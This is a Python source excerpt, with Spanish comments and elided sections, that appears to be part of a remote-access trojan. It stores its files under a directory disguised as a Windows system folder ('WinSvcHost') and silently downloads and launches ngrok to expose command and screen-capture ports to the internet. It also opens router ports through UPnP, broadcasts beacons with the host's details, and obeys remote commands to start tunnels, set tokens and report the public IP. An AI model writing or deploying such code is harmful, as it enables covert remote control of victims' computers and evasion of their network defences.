...
# ── Tunnel / IP pública / Ngrok / FRP ────────────────────────────────────────
TUNNEL_PORT   = 9003   # Puerto extra para recibir info del túnel
_tunnel_state = {"mode": None, "host": None, "port_cmd": 9000,
                 "port_screen": 9001, "active": False}
...
def _save_tunnel_info(info):
    try:
        ap = os.environ.get("APPDATA","") if platform.system()=="Windows"              else os.path.expanduser("~")
        cfg_dir = os.path.join(ap,"Microsoft","Windows","WinSvcHost")                   if platform.system()=="Windows"                   else os.path.join(ap,".wsh")
        os.makedirs(cfg_dir, exist_ok=True)
        with open(os.path.join(cfg_dir,"tunnel.json"),"w") as f:
            json.dump(info, f)
    except: pass

def start_ngrok_tunnel():
    """Descarga ngrok si no está y abre túnel TCP para puertos 9000 y 9001"""
    try:
        import urllib.request, zipfile, shutil
        ap      = os.environ.get("APPDATA","") if platform.system()=="Windows"                   else os.path.expanduser("~")
        cfg_dir = os.path.join(ap,"Microsoft","Windows","WinSvcHost")                   if platform.system()=="Windows" else os.path.join(ap,".wsh")
        os.makedirs(cfg_dir, exist_ok=True)
        ngrok_exe = os.path.join(cfg_dir,
                    "ngrok.exe" if platform.system()=="Windows" else "ngrok")
        ...
        if not os.path.exists(ngrok_exe):
            ...
            zpath = os.path.join(cfg_dir,"ngrok.zip")
            urllib.request.urlretrieve(url, zpath)
            with zipfile.ZipFile(zpath) as z: z.extractall(cfg_dir)
            os.remove(zpath)
            if platform.system() != "Windows":
                os.chmod(ngrok_exe, 0o755)

        # Leer token si existe
        token_file = os.path.join(cfg_dir,"ngrok_token.txt")
        token = ""
        ...
        # Iniciar ngrok para puerto 9000 (cmd)
        proc_cmd = subprocess.Popen(
            [ngrok_exe,"tcp","9000","--log=stdout","--log-format=json"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)

        # Leer URL del túnel
        import re
        tunnel_host_cmd = None
        tunnel_port_cmd = 9000
        deadline = time.time() + 15
        while time.time() < deadline:
            line = proc_cmd.stdout.readline()
            if not line: break
            try:
                ...
                if "tcp://" in url:
                    ...
                    if m:
                        tunnel_host_cmd = m.group(1)
                        tunnel_port_cmd = int(m.group(2))
                        break
            except: pass

        if not tunnel_host_cmd:
            proc_cmd.kill()
            return None

        # Iniciar ngrok para puerto 9001 (screen)
        proc_scr = subprocess.Popen(
            [ngrok_exe,"tcp","9001","--log=stdout","--log-format=json"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)

        tunnel_host_scr = tunnel_host_cmd
        tunnel_port_scr = 9001
        deadline2 = time.time() + 15
        while time.time() < deadline2:
            line = proc_scr.stdout.readline()
            if not line: break
            try:
                d = json.loads(line.decode())
                url = d.get("url","") or d.get("Url","")
                if "tcp://" in url:
                    m = re.search(r"tcp://([^:]+):(\d+)", url)
                    if m:
                        tunnel_host_scr = m.group(1)
                        tunnel_port_scr = int(m.group(2))
                        break
            except: pass

        info = {
            "mode":         "ngrok",
            "host_cmd":     tunnel_host_cmd,
            "port_cmd":     tunnel_port_cmd,
            "host_screen":  tunnel_host_scr,
            "port_screen":  tunnel_port_scr,
            "local_ip":     socket.gethostbyname(socket.gethostname()),
            "hostname":     socket.gethostname(),
            "ts":           time.time(),
            "active":       True
        }
        _tunnel_state.update(info)
        _save_tunnel_info(info)

        # Beacon con info de túnel
        def beacon_tunnel():
            while _tunnel_state.get("active"):
                try:
                    msg = json.dumps({
                        "type":"tunnel_beacon",
                        "hostname": socket.gethostname(),
                    ...
                    s.sendto(msg, ("<broadcast>", BEACON_PORT))
                    s.close()
                except: pass
                time.sleep(10)
        threading.Thread(target=beacon_tunnel, daemon=True).start()
...
def register_tunnel():
    """Registra IP pública (sin ngrok — solo IP directa)"""
    try:
...
def try_upnp_forward():
    try:
        ...
        u = miniupnpc.UPnP()
        u.discoverdelay = 200
        if u.discover() == 0: return None
        u.selectigd()
        ext_ip = u.externalipaddress()
        for port in [9000, 9001]:
            try: u.addportmapping(port,"TCP","","TCP",port,f"WinSvcHost_{port}",0)
            except: pass
        return ext_ip
    except: return None
        ...
        while True:
            ...
            try:
                ...
                # ── Actualización ──────────────────────────────────────────
                    ...
                    def _start_ng():
                        info = start_ngrok_tunnel()
                    if not _tunnel_state.get("active"):
                        threading.Thread(target=_start_ng,daemon=True).start()
                    res["result"] = json.dumps({"status":"starting","msg":"Ngrok iniciando, espera 15s y consulta tunnel_info"})

                elif action == "ngrok_stop":
                    _tunnel_state["active"] = False
                    try:
                        if platform.system()=="Windows":
                ...
                elif action == "ngrok_set_token":
                    token = cmd.get("token","")
                    try:
                        ap = os.environ.get("APPDATA","") if platform.system()=="Windows" else os.path.expanduser("~")
                        cfg_dir = os.path.join(ap,"Microsoft","Windows","WinSvcHost") if platform.system()=="Windows" else os.path.join(ap,".wsh")
                        os.makedirs(cfg_dir,exist_ok=True)
                        with open(os.path.join(cfg_dir,"ngrok_token.txt"),"w") as f: f.write(token)
                        res["result"] = json.dumps({"status":"ok"})
                    except Exception as e: res["result"] = json.dumps({"error":str(e)})

                elif action == "tunnel_info":
                    try:
                        ap = os.environ.get("APPDATA","") if platform.system()=="Windows" else os.path.expanduser("~")
                        cfg = os.path.join(ap,"Microsoft","Windows","WinSvcHost","tunnel.json")                               if platform.system()=="Windows"                               else os.path.join(ap,".wsh","tunnel.json")
                        if os.path.exists(cfg):
                            with open(cfg) as f: info = json.load(f)
                        else:
                            info = {}
                        # Refrescar IP pública ahora mismo
                        pub = get_public_ip()
                        info["public_ip"]  = pub
                        info["local_ip"]   = socket.gethostbyname(socket.gethostname())
                        info["hostname"]   = socket.gethostname()
                        res["result"] = json.dumps(info, ensure_ascii=False)
                    except Exception as e:
                        res["result"] = json.dumps({"error":str(e)})
...
if __name__ == "__main__":
    ...
    # Registrar IP pública en background
    threading.Thread(target=register_tunnel, daemon=True).start()
